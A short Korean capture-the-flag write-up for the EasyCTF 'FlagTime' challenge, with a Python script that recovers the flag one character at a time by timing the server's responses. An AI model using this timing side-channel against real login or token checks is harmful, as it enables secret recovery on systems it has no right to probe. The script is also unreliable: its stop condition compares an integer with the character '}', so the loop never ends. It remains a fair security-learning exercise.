# FlagTime

제목과 문제푸는 방식이 일치한다. 그냥 아무문자 asd를 넣었을 때 와 맞는 정답을 넣었을 때 문자열을 비교해서 리턴해주는 시간이 차이가 난다. 타이밍 어택인가뭔가 라고 어디서 본듯. 실제 플래그도 타이밍 어택이더라....  

```python
from socket import *
import time
import base64


def send(data):

	ip="c1.easyctf.com"
	port=12482

	s=socket(AF_INET,SOCK_STREAM)  #서버와 소통할 소켓을 만드는 과정
	s.connect((ip,port))
	s.recv(1024)
	s.send(data.encode()+"\n".encode()) #데이터 전송
	start = time.time() #문자열 보낸 시간 체크
	recv=s.recv(1024)
	reqtime = time.time() - start #답을 받은 시간 체크
	return reqtime
ip="c1.easyctf.com"
port=12482

#s=socket(AF_INET,SOCK_STREAM)  #서버와 소통할 소켓을 만드는 과정
flag="easyctf{"
#recv=s.recv(1024)
while True:
	max=0
	for letter in range(30,127):   #문자열 전송
		start_cnt=0
		#s.connect((ip,port))
		cnt_time=send(flag+chr(letter))
		print(flag+chr(letter)+"   ",end="")
		print(cnt_time)
		if cnt_time>max: #문자열을 하나씩 비교하면서 리턴받는 시간이 길수록 답에 근접하다
			max=cnt_time
			add_flag=letter
	flag+=chr(add_flag)
	print(flag)
	if add_flag=='}':
		print("flag ============>",flag)
		break
```
